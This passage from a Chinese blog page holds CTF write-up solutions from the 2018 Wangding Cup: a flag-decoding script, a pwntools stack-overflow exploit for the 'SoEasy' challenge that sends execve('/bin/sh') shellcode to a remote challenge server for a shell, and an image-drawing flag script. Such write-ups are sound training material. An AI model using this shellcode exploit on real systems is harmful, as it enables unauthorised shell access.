+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">key1&#x3D; [0x3, 0x4, 0x5, 0x6, 0x7, 0x8, 0x9, 0xA, 0xB, 0xC, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0]</span><br><span class="line">key2&#x3D; [0x0B, 0x08, 0x07, 0x07, 0x08, 0x0C, 0x03, 0x02, 0x10, 0x06, 0x0D, 0x05, 0x07, 0x10, 0x04, 0x01, 0x00, 0x0F, 0x10, 0x08, 0x03, 0x06, 0x0E, 0x10, 0x00, 0x08, 0x06, 0x09, 0x0C, 0x0E, 0x0D, 0x0B, 0x0F, 0x07, 0x0B, 0x0E]</span><br><span class="line">flag &#x3D; &quot;&quot;</span><br><span class="line">for i in range(35):</span><br><span class="line">  flag +&#x3D; chr( key1[key2[i]]+45)</span><br><span class="line">print  &quot;flag&#123;&quot;+flag+&quot;&#125;&quot;</span><br></pre></td></tr></table></figure>
+<h3 id="0x04-SoEasy"><a href="#0x04-SoEasy" class="headerlink" title="0x04 SoEasy"></a>0x04 SoEasy</h3><p>程序没开任何保护：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>
+<p>最简单的shellcode栈溢出<br>EXP:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p&#x3D;remote(&quot;106.75.95.47&quot;,42264)</span><br><span class="line">p.recvuntil(&quot;-&gt;0x&quot;)</span><br><span class="line">s&#x3D;p.recvuntil(&quot;do?&quot;)</span><br><span class="line">addr&#x3D;int(s[:8],16)</span><br><span class="line">payload&#x3D;&quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb8\x0b\x00\x00\x00\xcd\x80&quot;+&quot;A&quot;*52+p32(addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="0x05-dewas"><a href="#0x05-dewas" class="headerlink" title="0x05 dewas"></a>0x05 dewas</h3><p>很简单的画图,记一下脚本：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">from PIL import Image</span><br><span class="line"></span><br><span class="line">MAX&#x3D;1000</span><br><span class="line"></span><br><span class="line">pic&#x3D;Image.new(&quot;RGB&quot;,(MAX,MAX))</span><br><span class="line"></span><br><span class="line">str&#x3D;&quot;ddssdssdssdssdssdssdswdwwdwwdwwdwwddssdssdssdssdswdwwdwwdwwdwwdwwdwwdedsssssssssssssedwdwwdwwdwwdwwdwwdwwddssdssdssdsaaaaaaaaddddddddsdssdssdsdedwwwedsddsdddsddddwdddwddwwawaaawaaawaaawaaawadwdwwdddwdddsdddsddsedddddwwwessssssssssssssddddwdddwddwddwddwdwwdwawwaawaawaawaaawaaaaeddddddddddddddddddesssssssssssssseddddddewwwwwwwwwwwwwwdssdssdssdssdssdssdssdwwwwwwwwwwwwwweddddddddddddddssssssewwawwawawaaasasassasssassdsssdsddsddddwdwwdwwwaaaeddddddssssssewdwdwdwdwdwdwdawawawawawawaweddddddddddeddddddddaaaaaaaasssssssddddddaaaaaassssssseddddddddddddwwwwwwwwwwwwwwessssssssssdssdsddsdddwddwdwwdwwwwwwwwwwedddddssssssssssssssewwwwwwwwwwwwwwdssdssdssdssdssdssdssdwwwwwwwwwwwwwwedddddesssssssssesssess&quot;</span><br><span class="line"></span><br><span class="line">flagx&#x3D;0</span><br><span class="line">flagy&#x3D;20</span><br><span class="line">for  y  in  range(0,MAX):</span><br><span class="line"></span><br><span class="line">  for  x  in  range(0,MAX):</span><br><span class="line">       pic.putpixel([x,y],(255,255,255))</span><br><span class="line">for key in str:</span><br><span class="line">   if key&#x3D;&#x3D;&quot;e&quot;:</span><br><span class="line">        pass</span><br><span class="line">   if key&#x3D;&#x3D;&quot;d&quot;:</span><br><span class="line">      for x in range(0,5): </span><br><span class="line">           pic.putpixel([flagx+x,flagy],(0,0,0))</span><br><span class="line">      flagx&#x3D;flagx+5</span><br><span class="line">   if key&#x3D;&#x3D;&quot;s&quot;:</span><br><span class="line">       for x in range(0,5):</span><br><span class="line">          pic.putpixel([flagx,flagy+x],(0,0,0))</span><br><span class="line">       flagy+&#x3D;5</span><br><span class="line">   if key&#x3D;&#x3D;&quot;a&quot;:</span><br><span class="line">        for x in range(0,5):</span><br><span class="line">          pic.putpixel([flagx-x,flagy],(0,0,0))</span><br><span class="line">        flagx-&#x3D;5</span><br><span class="line">   if key&#x3D;&#x3D;&quot;w&quot;:</span><br><span class="line">        for x in range(0,5):</span><br><span class="line">          pic.putpixel([flagx,flagy-x],(0,0,0))</span><br><span class="line">        flagy-&#x3D;5</span><br><span class="line">pic.show()</span><br><span class="line"></span><br><span class="line">pic.save(&quot;flag.png&quot;)</span><br></pre></td></tr></table></figure>
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-babyre"><span class="toc-number">1.</span> <span class="toc-text">0x01 babyre</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-SimpleSMC"><span class="toc-number">2.</span> <span class="toc-text">0x02 SimpleSMC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-I-like-pack"><span class="toc-number">3.</span> <span class="toc-text">0x03 I_like_pack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-SoEasy"><span class="toc-number">4.</span> <span class="toc-text">0x04 SoEasy</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x05-dewas"><span class="toc-number">5.</span> <span class="toc-text">0x05 dewas</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2018/08/28/%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%AC%AC%E4%B8%89%E5%9C%BA-Re/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2018/08/28/%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%AC%AC%E4%B8%89%E5%9C%BA-Re/&text=网鼎杯第三场_Re" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2018/08/28/%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%AC%AC%E4%B8%89%E5%9C%BA-Re/&title=网鼎杯第三场_Re" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2018/08/28/%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%AC%AC%E4%B8%89%E5%9C%BA-Re/&is_video=false&description=网鼎杯第三场_Re" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=网鼎杯第三场_Re&body=Check out this article: http://yoursite.com/2018/08/28/%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%AC%AC%E4%B8%89%E5%9C%BA-Re/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2018/08/28/%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%AC%AC%E4%B8%89%E5%9C%BA-Re/&title=网鼎杯第三场_Re" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2018/08/28/%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%AC%AC%E4%B8%89%E5%9C%BA-Re/&title=网鼎杯第三场_Re" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2018/08/28/%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%AC%AC%E4%B8%89%E5%9C%BA-Re/&title=网鼎杯第三场_Re" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2018/08/28/%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%AC%AC%E4%B8%89%E5%9C%BA-Re/&title=网鼎杯第三场_Re" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2018/08/28/%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%AC%AC%E4%B8%89%E5%9C%BA-Re/&name=网鼎杯第三场_Re&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2020 Kirin
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+</body>
+</html>
+<!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+<!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
